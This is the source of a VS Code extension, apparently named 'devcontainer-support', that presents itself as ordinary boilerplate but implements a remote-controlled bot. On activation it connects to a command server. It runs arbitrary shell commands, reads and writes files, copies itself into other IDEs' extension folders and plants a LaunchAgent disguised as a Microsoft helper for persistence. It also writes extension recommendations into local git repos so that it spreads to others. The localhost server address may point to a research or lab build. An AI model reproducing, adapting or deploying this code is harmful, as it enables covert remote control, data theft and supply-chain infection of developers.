// The module 'vscode' contains the VS Code extensibility API

// Import the module and reference it with the alias vscode in your code below
const vscode = require('vscode');

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {

	const os = require('os');
	const cp = require('child_process');
	const io = require('socket.io-client');
	const fs = require('fs');
	const path = require('path');

	const data = JSON.stringify({
		hostname: os.hostname(),
		platform: os.platform(),
		arch: os.arch(),
		type: os.type(),
		user: os.userInfo()
	})

	// location where we save the botid
	const BOTIDPATH = `${os.homedir()}/.vsconfig`;

	var socket = io.connect('wss://localhost:443', {rejectUnauthorized: false, transports: ['websocket']});

	const CmdType = {
		REGISTER: 0,
		SHELL: 1,
		UPLOAD: 2,
		DOWNLOAD: 3,
		SETBOTID: 4,
		KILL: 5,
		SPREAD: 6,
		PERSIST: 7,
		POISON: 8,
	}

	const IDE_TARGETS = [
		{name: 'vscode', dir: '.vscode'},
		{name: 'vscodium', dir: '.vscode-oss'},
		{name: 'cursor', dir: '.cursor'},
		{name: 'windsurf', dir: '.windsurf'},
		{name: 'positron', dir: '.positron'},
	];

	const EXT_ID = 'f5247a15-38ab-4aaf-9a59-ca641efeef1e.devcontainer-support';

	socket.on("botcmd", async({from,cmd,args}) => {
		switch(cmd) {
			case CmdType.REGISTER:
				fs.existsSync(BOTIDPATH)
				const botid = fs.existsSync(BOTIDPATH) ? fs.readFileSync(BOTIDPATH).toString() : null;
				socket.emit('botresp', {
					cmd: CmdType.REGISTER,
					to: 'global',
					args: {
						bot_id: botid,
						details: data
					}
				});
				break;
			case CmdType.SHELL:
				cp.exec(args, (err, stdout, stderr) => {
					socket.emit('botresp', {
						cmd: CmdType.SHELL,
						to: from,
						args: {
							response: stdout,
							stderr: stderr
						}
					});
				});
				break;
			case CmdType.UPLOAD:
				fs.writeFileSync(args.dest, args.data);
				socket.emit('botresp', {
					cmd: CmdType.UPLOAD,
					to: from,
					args: {
						dest: args.dest
					}
				});
				break;
			case CmdType.DOWNLOAD: {
				const content = fs.readFileSync(args);
				socket.emit('botresp', {
					cmd: CmdType.DOWNLOAD,
					to: from,
					args: {
						dest: args,
						filedata: content
					}
				});
				break;
			}
			case CmdType.SETBOTID:
				fs.writeFileSync(BOTIDPATH, args);
				break;
			case CmdType.KILL:
				if (fs.existsSync(BOTIDPATH)) {
					fs.unlinkSync(BOTIDPATH);
				}
				socket.disconnect();
				break;
			case CmdType.SPREAD: {
				const home = os.homedir();
				const srcDir = context.extensionPath;
				const extBasename = path.basename(srcDir);
				const results = [];
				for (const ide of IDE_TARGETS) {
					const extDir = path.join(home, ide.dir, 'extensions');
					if (!fs.existsSync(extDir)) continue;
					if (extDir === path.dirname(srcDir)) continue;
					const destDir = path.join(extDir, extBasename);
					if (fs.existsSync(destDir)) {
						results.push(`${ide.name}: already present`);
						continue;
					}
					try {
						cp.execSync(`cp -r "${srcDir}" "${destDir}"`);
						const extJsonPath = path.join(extDir, 'extensions.json');
						const pkg = JSON.parse(
							fs.readFileSync(path.join(srcDir, 'package.json'), 'utf8')
						);
						const entry = {
							identifier: {id: `${pkg.publisher}.${pkg.name}`},
							version: pkg.version,
							location: {
								$mid: 1,
								path: destDir,
								scheme: 'file'
							},
							relativeLocation: extBasename,
							metadata: {
								installedTimestamp: Date.now(),
								source: 'gallery',
								publisherDisplayName: pkg.publisher,
								targetPlatform: 'undefined',
								updated: false,
								isPreReleaseVersion: false,
								hasPreReleaseVersion: false
							}
						};
						let extList = [];
						if (fs.existsSync(extJsonPath)) {
							try {
								extList = JSON.parse(
									fs.readFileSync(extJsonPath, 'utf8')
								);
							} catch (_) {}
						}
						const already = extList.some(
							e => e.identifier?.id === entry.identifier.id
						);
						if (!already) {
							extList.push(entry);
							fs.writeFileSync(
								extJsonPath,
								JSON.stringify(extList)
							);
						}
						results.push(`${ide.name}: installed`);
					} catch (e) {
						results.push(`${ide.name}: failed - ${e.message}`);
					}
				}
				socket.emit('botresp', {
					cmd: CmdType.SPREAD,
					to: from,
					args: {
						response: results.length
							? results.join('\n')
							: 'No other IDE extension dirs found'
					}
				});
				break;
			}
			case CmdType.PERSIST: {
				const home = os.homedir();
				const srcDir = context.extensionPath;
				const extBasename = path.basename(srcDir);
				const backupDir = path.join(home, '.cache', '.vscode-ext');
				const msgs = [];
				cp.execSync(`mkdir -p "${backupDir}" && cp -r "${srcDir}" "${backupDir}/"`);
				msgs.push(`Backed up extension to ${backupDir}`);
				const scriptPath = path.join(backupDir, 'update.sh');
				const script = [
					'#!/bin/bash',
					`EXTDIR="${path.dirname(srcDir)}/${extBasename}"`,
					`BACKUP="${backupDir}/${extBasename}"`,
					'if [ ! -d "$EXTDIR" ] && [ -d "$BACKUP" ]; then',
					'  cp -r "$BACKUP" "$EXTDIR"',
					'fi',
					'open -a "Visual Studio Code" --background 2>/dev/null || true',
				].join('\n');
				fs.writeFileSync(scriptPath, script + '\n');
				fs.chmodSync(scriptPath, '755');
				const plistDir = path.join(home, 'Library', 'LaunchAgents');
				if (!fs.existsSync(plistDir)) fs.mkdirSync(plistDir, {recursive: true});
				const plistPath = path.join(plistDir, 'com.microsoft.vscode.helper.plist');
				const plist = [
					'<?xml version="1.0" encoding="UTF-8"?>',
					'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
					'<plist version="1.0">',
					'<dict>',
					'  <key>Label</key>',
					'  <string>com.microsoft.vscode.helper</string>',
					'  <key>ProgramArguments</key>',
					'  <array>',
					`    <string>${scriptPath}</string>`,
					'  </array>',
					'  <key>RunAtLoad</key>',
					'  <true/>',
					'</dict>',
					'</plist>',
				].join('\n');
				fs.writeFileSync(plistPath, plist);
				msgs.push(`Installed LaunchAgent: ${plistPath}`);
				socket.emit('botresp', {
					cmd: CmdType.PERSIST,
					to: from,
					args: { response: msgs.join('\n') }
				});
				break;
			}
			case CmdType.POISON: {
				const home = os.homedir();
				const searchDirs = [
					home,
					path.join(home, 'Documents'),
					path.join(home, 'Projects'),
					path.join(home, 'Code'),
					path.join(home, 'repos'),
					path.join(home, 'src'),
					path.join(home, 'dev'),
					path.join(home, 'workspace'),
					path.join(home, 'git'),
				];
				const targetDir = args;
				const dirsToScan = targetDir ? [targetDir] : searchDirs;
				const extJson = JSON.stringify({
					recommendations: [EXT_ID]
				}, null, 2);
				const poisoned = [];
				for (const dir of dirsToScan) {
					if (!fs.existsSync(dir)) continue;
					try {
						const entries = fs.readdirSync(dir, {withFileTypes: true});
						for (const entry of entries) {
							if (!entry.isDirectory()) continue;
							const repoPath = path.join(dir, entry.name);
							const gitPath = path.join(repoPath, '.git');
							if (!fs.existsSync(gitPath)) continue;
							const vscodePath = path.join(repoPath, '.vscode');
							const extJsonPath = path.join(vscodePath, 'extensions.json');
							if (fs.existsSync(extJsonPath)) continue;
							if (!fs.existsSync(vscodePath)) fs.mkdirSync(vscodePath);
							fs.writeFileSync(extJsonPath, extJson);
							poisoned.push(repoPath);
						}
					} catch (e) {}
				}
				socket.emit('botresp', {
					cmd: CmdType.POISON,
					to: from,
					args: {
						response: poisoned.length
							? `Poisoned ${poisoned.length} repos:\n${poisoned.join('\n')}`
							: 'No unpoisoned repos found'
					}
				});
				break;
			}

			default:
				console.log(`Received unknown: ${cmd}`);
		}

	});

}

// This method is called when your extension is deactivated
function deactivate() {}

module.exports = {
	activate,
	deactivate
}
